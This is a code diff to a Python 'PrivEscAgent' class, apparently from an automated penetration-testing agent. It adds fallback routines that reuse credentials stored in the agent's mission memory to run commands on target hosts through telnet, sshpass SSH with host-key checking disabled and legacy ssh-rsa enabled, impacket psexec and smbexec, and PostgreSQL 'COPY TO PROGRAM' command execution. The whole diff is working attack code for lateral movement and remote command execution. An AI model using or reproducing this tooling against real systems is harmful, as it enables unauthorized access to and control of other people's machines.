@@ -241,12 +241,12 @@ class PrivEscAgent(BaseAgent):
             border_style="magenta",
         ))
 
-        # Load credentials from MissionMemory for SSH fallback
+        # Load credentials from MissionMemory for service-based fallback
         self._ssh_creds = self._load_credentials_from_memory(target)
         if self._ssh_creds:
             self.log_info(
-                f"Loaded SSH fallback credentials: {self._ssh_creds['username']}@{self._ssh_creds['ip']} "
-                f"(via {self._ssh_creds['service']})"
+                f"Loaded fallback credentials: {self._ssh_creds['username']}@{self._ssh_creds['ip']} "
+                f"(service: {self._ssh_creds['service']})"
             )
 
         try:
@@ -990,11 +990,11 @@ class PrivEscAgent(BaseAgent):
         except socket.timeout:
             pass  # Fall through to SSH
         except Exception:
-            pass  # Fall through to SSH
+            pass  # Fall through to credential-based access
         
-        # Socket failed — try SSH with credentials if available
+        # Socket failed — try credential-based access if available
         if self._ssh_creds:
-            return self._exec_via_ssh(target, command, timeout)
+            return self._exec_via_creds(target, command, timeout)
         return ""
 
     def _load_credentials_from_memory(self, target: str) -> Optional[dict]:
@@ -1029,26 +1029,91 @@ class PrivEscAgent(BaseAgent):
             self.log_warning(f"Failed to load credentials: {e}")
         return None
 
-    def _exec_via_ssh(self, target: str, command: str, timeout: int = 15) -> str:
-        """Execute command via SSH using stored credentials."""
+    def _exec_via_creds(self, target: str, command: str, timeout: int = 15) -> str:
+        """Execute command using stored credentials via appropriate service."""
         if not self._ssh_creds:
             return ""
         
+        service = self._ssh_creds.get("service", "").lower()
+        user = self._ssh_creds["username"]
+        pwd = self._ssh_creds["password"]
+        cred_ip = self._ssh_creds.get("ip", target)
+        
+        # Try service-specific methods in priority order
+        methods = []
+        
+        if service in ("ssh", "telnet"):
+            methods.append(("telnet", self._exec_via_telnet))
+            methods.append(("ssh_legacy", self._exec_via_ssh_legacy))
+        elif service in ("smb", "samba"):
+            methods.append(("psexec", self._exec_via_psexec))
+            methods.append(("smbexec", self._exec_via_smbexec))
+        elif service in ("postgres", "postgresql"):
+            methods.append(("psql", self._exec_via_psql))
+        elif service == "mysql":
+            methods.append(("mysql", self._exec_via_mysql))
+        else:
+            # Try all methods
+            methods = [
+                ("telnet", self._exec_via_telnet),
+                ("ssh_legacy", self._exec_via_ssh_legacy),
+                ("psexec", self._exec_via_psexec),
+            ]
+        
+        for method_name, method_func in methods:
+            try:
+                output = method_func(cred_ip, user, pwd, command, timeout)
+                if output and ("uid=" in output or "root" in output.lower() or len(output) > 5):
+                    self.log_info(f"Credential exec via {method_name} succeeded")
+                    return output
+            except Exception as e:
+                self.log_warning(f"{method_name} failed: {e}")
+        
+        return ""
+
+    def _exec_via_telnet(self, target: str, user: str, pwd: str, command: str, timeout: int = 15) -> str:
+        """Execute command via telnet (for legacy systems)."""
+        import pexpect
         try:
-            # Use sshpass for non-interactive password auth
-            user = self._ssh_creds["username"]
-            pwd = self._ssh_creds["password"]
+            child = pexpect.spawn(f'telnet {target}', timeout=timeout)
+            child.expect(['login:', 'Username:'], timeout=10)
+            child.sendline(user)
+            child.expect(['Password:', 'password:'], timeout=10)
+            child.sendline(pwd)
+            child.expect([r'\$', '#', '>'], timeout=10)
+            child.sendline(command)
+            child.expect([r'\$', '#', '>'], timeout=timeout)
+            output = child.before.decode(errors='ignore')
+            child.sendline('exit')
+            child.close()
             
-            # Escape special chars in command
+            # Clean up output (remove command echo)
+            lines = output.strip().split('\n')
+            if lines and command[:15] in lines[0]:
+                output = '\n'.join(lines[1:])
+            
+            self._verbose_shell_output(output[:500])
+            return output.strip()
+        except ImportError:
+            self.log_warning("pexpect not installed - telnet fallback unavailable")
+            return ""
+        except Exception as e:
+            self.log_warning(f"Telnet execution failed: {e}")
+            return ""
+
+    def _exec_via_ssh_legacy(self, target: str, user: str, pwd: str, command: str, timeout: int = 15) -> str:
+        """Execute command via SSH with legacy key types enabled."""
+        try:
             escaped_cmd = command.replace("'", "'\\''")
-            
             result = subprocess.run(
                 [
                     "sshpass", "-p", pwd,
-                    "ssh", "-o", "StrictHostKeyChecking=no",
+                    "ssh", 
+                    "-o", "StrictHostKeyChecking=no",
                     "-o", "UserKnownHostsFile=/dev/null",
                     "-o", "ConnectTimeout=10",
-                    "-o", "BatchMode=no",
+                    "-o", "HostkeyAlgorithms=+ssh-rsa",
+                    "-o", "PubkeyAcceptedAlgorithms=+ssh-rsa",
                     f"{user}@{target}",
                     escaped_cmd,
                 ],
@@ -1056,21 +1121,104 @@ class PrivEscAgent(BaseAgent):
                 text=True,
                 timeout=timeout,
             )
-            
             output = result.stdout.strip()
             if result.returncode == 0 and output:
                 self._verbose_shell_output(output[:500])
                 return output
-            return ""
-        except subprocess.TimeoutExpired:
-            self.log_warning(f"SSH command timed out: {command[:50]}")
+            if result.stderr and "Permission denied" not in result.stderr:
+                self.log_warning(f"SSH error: {result.stderr[:100]}")
             return ""
         except FileNotFoundError:
-            self.log_warning("sshpass not installed - cannot use credential-based access")
             return ""
         except Exception as e:
-            self.log_warning(f"SSH execution failed: {e}")
+            self.log_warning(f"SSH legacy failed: {e}")
             return ""
+
+    def _exec_via_psexec(self, target: str, user: str, pwd: str, command: str, timeout: int = 30) -> str:
+        """Execute command via impacket psexec (SMB)."""
+        try:
+            result = subprocess.run(
+                [
+                    "impacket-psexec",
+                    f"{user}:{pwd}@{target}",
+                    command,
+                ],
+                capture_output=True,
+                text=True,
+                timeout=timeout,
+            )
+            output = result.stdout.strip()
+            if output:
+                self._verbose_shell_output(output[:500])
+                return output
+            return ""
+        except FileNotFoundError:
+            # Try alternative name
+            try:
+                result = subprocess.run(
+                    ["psexec.py", f"{user}:{pwd}@{target}", command],
+                    capture_output=True, text=True, timeout=timeout
+                )
+                return result.stdout.strip()
+            except:
+                return ""
+        except Exception:
+            return ""
+
+    def _exec_via_smbexec(self, target: str, user: str, pwd: str, command: str, timeout: int = 30) -> str:
+        """Execute command via impacket smbexec."""
+        try:
+            result = subprocess.run(
+                [
+                    "impacket-smbexec",
+                    f"{user}:{pwd}@{target}",
+                    command,
+                ],
+                capture_output=True,
+                text=True,
+                timeout=timeout,
+            )
+            output = result.stdout.strip()
+            if output:
+                self._verbose_shell_output(output[:500])
+                return output
+            return ""
+        except FileNotFoundError:
+            return ""
+        except Exception:
+            return ""
+
+    def _exec_via_psql(self, target: str, user: str, pwd: str, command: str, timeout: int = 15) -> str:
+        """Execute OS command via PostgreSQL COPY TO PROGRAM (requires superuser)."""
+        try:
+            # Use psql to run command via COPY ... TO PROGRAM
+            sql_cmd = f"COPY (SELECT '') TO PROGRAM '{command}'"
+            result = subprocess.run(
+                [
+                    "psql",
+                    "-h", target,
+                    "-U", user,
+                    "-c", sql_cmd,
+                ],
+                capture_output=True,
+                text=True,
+                timeout=timeout,
+                env={**subprocess.os.environ, "PGPASSWORD": pwd},
+            )
+            # COPY TO PROGRAM doesn't return output, so run SELECT version() to verify
+            if result.returncode == 0:
+                self.log_info("PostgreSQL command executed (no output capture)")
+                return "command_executed"
+            return ""
+        except FileNotFoundError:
+            return ""
+        except Exception:
+            return ""
+
+    def _exec_via_mysql(self, target: str, user: str, pwd: str, command: str, timeout: int = 15) -> str:
+        """Execute OS command via MySQL (limited, needs FILE priv or UDF)."""
+        # MySQL command execution is complex, skip for now
+        return ""
 
     # ══════════════════════════════════════════════════════════════════════════
     # Result Builders
